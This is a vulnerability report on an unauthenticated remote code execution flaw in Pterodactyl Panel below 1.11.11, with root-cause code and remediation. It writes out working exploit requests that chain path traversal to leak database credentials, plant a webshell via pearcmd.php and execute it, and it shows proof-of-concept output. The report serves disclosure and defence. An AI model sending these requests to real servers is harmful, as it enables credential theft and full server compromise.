# CVE-2025-49132 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-49132
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **Affected Software**: Pterodactyl Panel < 1.11.11
- **CVSS Score**: 10.0 (Critical)
- **Vulnerability Type**: Unauthenticated Remote Code Execution

## Vulnerability Description

Pterodactyl Panel versions prior to 1.11.11 contain an unauthenticated remote code execution vulnerability in the `/locales/locale.json` endpoint. By manipulating the `locale` and `namespace` query parameters with path traversal sequences, an attacker can include arbitrary PHP files, leading to code execution.

## Root Cause Analysis

The vulnerability exists in `/app/Http/Controllers/Base/LocaleController.php`:

```php
public function __invoke(Request $request): JsonResponse
{
    $locales = explode(' ', $request->input('locale') ?? '');
    $namespaces = explode(' ', $request->input('namespace') ?? '');

    foreach ($locales as $locale) {
        foreach ($namespaces as $namespace) {
            $response[$locale][$namespace] = $this->i18n(
                $this->loader->load($locale, str_replace('.', '/', $namespace))
            );
        }
    }
    return new JsonResponse($response, ...);
}
```

The `locale` and `namespace` parameters are passed directly to Laravel's translation file loader, which uses `require` to load PHP files. This allows Local File Inclusion (LFI).

Combined with `pearcmd.php` (PHP's PEAR command utility), an attacker can:
1. Create a malicious PHP file using PEAR's `config-create` command
2. Include the malicious file to execute arbitrary code

## Exploitation Chain

### Stage 1: Information Disclosure

```
GET /locales/locale.json?locale=../../../app&namespace=config/database
```

Response contains database credentials in JSON format.

### Stage 2: Create Webshell via pearcmd.php

```
GET /locales/locale.json?+config-create+/&locale=../../../usr/local/lib/php&namespace=pearcmd&/<?=`id`?>+/tmp/shell.php
```

This includes `pearcmd.php` and passes arguments to create a configuration file containing PHP code at `/tmp/shell.php`.

### Stage 3: Execute Webshell

```
GET /locales/locale.json?locale=../../../../tmp&namespace=shell
```

This includes the created webshell, executing the embedded command.

## Proof of Concept Results

```
============================================================
CVE-2025-49132 - Pterodactyl Panel Unauthenticated RCE
Affected versions: < 1.11.11
============================================================
[*] Target: localhost:8080
[*] Command: id

[*] Stage 1: Leaking database credentials...
[+] Database credentials leaked successfully!
[*] Stage 2: Creating webshell with command: id
[+] Webshell created at /tmp/yfbgkmok.php
[*] Stage 3: Executing webshell...

============================================================
[+] RCE SUCCESSFUL!
============================================================
[+] Command output: uid=100(nginx) gid=101(nginx) groups=82(www-data),101(nginx),101(nginx)
============================================================
```

## Impact

An attacker can:
1. **Execute arbitrary commands** on the server as the web server user (nginx)
2. **Leak sensitive configuration** including database credentials, API keys
3. **Access the database** to create admin accounts or steal user data
4. **Compromise managed game servers** through the panel's API
5. **Establish persistent access** via reverse shells or web backdoors

## Technical Requirements

- `register_argc_argv` must be enabled in PHP (default in many configurations)
- `pearcmd.php` must exist (standard in PHP installations)
- Affected Pterodactyl Panel version < 1.11.11

## Test Environment

- **Target Version**: ghcr.io/pterodactyl/panel:v1.11.10
- **Database**: MariaDB 10.5
- **PHP Version**: 8.2.25
- **Test Date**: 2026-02-03

## Remediation

1. **Upgrade** to Pterodactyl Panel version 1.11.11 or later
2. **Temporary workaround**: Block access to `/locales/locale.json` at the web server level (breaks localization)
3. **WAF**: Deploy a Web Application Firewall with path traversal detection rules

## References

- https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843
- https://nvd.nist.gov/vuln/detail/CVE-2025-49132
- https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0
